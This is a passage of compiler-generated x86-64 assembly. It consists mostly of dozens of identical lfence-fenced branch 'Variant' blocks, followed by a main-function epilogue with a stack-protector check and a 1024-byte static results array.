	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 58
.Lmain_win0_var58:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 59
.Lmain_win0_var59:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 60
.Lmain_win0_var60:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 61
.Lmain_win0_var61:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 62
.Lmain_win0_var62:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 63
.Lmain_win0_var63:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 64
.Lmain_win0_var64:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 65
.Lmain_win0_var65:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 66
.Lmain_win0_var66:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 67
.Lmain_win0_var67:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 68
.Lmain_win0_var68:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 69
.Lmain_win0_var69:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 70
.Lmain_win0_var70:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 71
.Lmain_win0_var71:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 72
.Lmain_win0_var72:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 73
.Lmain_win0_var73:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 74
.Lmain_win0_var74:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 75
.Lmain_win0_var75:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 76
.Lmain_win0_var76:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 77
.Lmain_win0_var77:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 78
.Lmain_win0_var78:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 79
.Lmain_win0_var79:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 80
.Lmain_win0_var80:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 81
.Lmain_win0_var81:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 82
.Lmain_win0_var82:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 83
.Lmain_win0_var83:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 84
.Lmain_win0_var84:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 85
.Lmain_win0_var85:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 86
.Lmain_win0_var86:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 87
.Lmain_win0_var87:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 88
.Lmain_win0_var88:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 89
.Lmain_win0_var89:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 90
.Lmain_win0_var90:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 91
.Lmain_win0_var91:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 92
.Lmain_win0_var92:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 93
.Lmain_win0_var93:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 94
.Lmain_win0_var94:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 95
.Lmain_win0_var95:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 96
.Lmain_win0_var96:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 97
.Lmain_win0_var97:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 98
.Lmain_win0_var98:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 99
.Lmain_win0_var99:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	addq	$32, %rsp
	subq	%fs:40, %rdx
	je	.L44
	call	__stack_chk_fail@PLT
.L44:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4381:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-2ubuntu1~20.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

